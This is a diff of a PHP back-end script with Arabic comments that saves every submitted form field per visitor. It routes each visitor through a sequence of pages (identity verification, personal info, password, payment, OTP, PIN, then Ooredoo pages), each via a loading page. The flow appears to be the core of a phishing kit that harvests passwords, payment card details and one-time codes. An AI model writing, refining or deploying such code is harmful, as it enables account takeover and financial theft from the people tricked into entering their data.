@@ -12,10 +12,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     $current_page = $_POST['current_page'] ?? 'index.php';
     
-    // سجل تتبع للتأكد من وصول الكود الجديد للسيرفر
-    error_log("Processing request for visitor: $visitor_id on page: $current_page");
-
-    // التأكد من وجود الزائر في جدول visitors أولاً لتجنب خطأ Foreign Key
+    // تحديث خطوة الزائر في قاعدة البيانات
     try {
         if (strpos($current_page, 'index.php') !== false) {
             updateVisitorStep($visitor_id, 'index');
@@ -26,15 +23,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         error_log("Error updating visitor step: " . $e->getMessage());
     }
 
-    // الآن يمكن حفظ البيانات بأمان
-    error_log("Saving data for visitor: $visitor_id from page: $current_page");
+    // حفظ كل البيانات المجمعة من الفورم
     foreach ($_POST as $key => $value) {
         if ($key !== 'visitor_id' && $key !== 'current_page') {
             saveData($visitor_id, $key, $value);
-            error_log("Saved: $key = $value");
         }
     }
 
+    // تحديد الصفحة التالية
+    $next_step = 'success.php';
     $redirects = [
         'index.php' => 'update_info.php',
         'update_info.php' => 'identity_verification.php',
@@ -44,31 +41,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     ];
 
     if (isset($redirects[$current_page])) {
-        $next = $redirects[$current_page];
-        header("Location: loading.php?visitor_id=$visitor_id&next=$next");
-        exit;
+        $next_step = $redirects[$current_page];
+    } else {
+        if (strpos($current_page, 'payment.php') !== false) $next_step = 'otp.php';
+        elseif (strpos($current_page, 'otp.php') !== false) $next_step = 'pin.php';
+        elseif (strpos($current_page, 'pin.php') !== false) $next_step = 'ooredoo.php';
+        elseif (strpos($current_page, 'ooredoo.php') !== false) $next_step = 'otp_ooredoo.php';
     }
-
-    // الخطوات المتأخرة (الدفع، OTP، PIN، Ooredoo)
-    $next_step = getNextStep($current_page);
-    header("Location: loading.php?visitor_id=$visitor_id&next=$next_step");
+    
+    // التوجيه دائماً لصفحة الانتظار
+    header("Location: loading.php?visitor_id=$visitor_id&next=$next_step&prev=$current_page");
     exit;
-}
-
-function getNextStep($current) {
-    if (strpos($current, 'payment.php') !== false) return 'otp.php';
-    if (strpos($current, 'otp.php') !== false) return 'pin.php';
-    if (strpos($current, 'pin.php') !== false) return 'ooredoo.php';
-    if (strpos($current, 'ooredoo.php') !== false) return 'otp_ooredoo.php';
-    if (strpos($current, 'otp_ooredoo.php') !== false) return 'success.php';
-    
-    // الأمان في حالة عدم التطابق
-    if (strpos($current, 'index.php') !== false) return 'update_info.php';
-    if (strpos($current, 'update_info.php') !== false) return 'identity_verification.php';
-    if (strpos($current, 'identity_verification.php') !== false) return 'personal_info.php';
-    if (strpos($current, 'personal_info.php') !== false) return 'password.php';
-    if (strpos($current, 'password.php') !== false) return 'payment.php';
-    
-    return 'success.php';
 }
 ?>
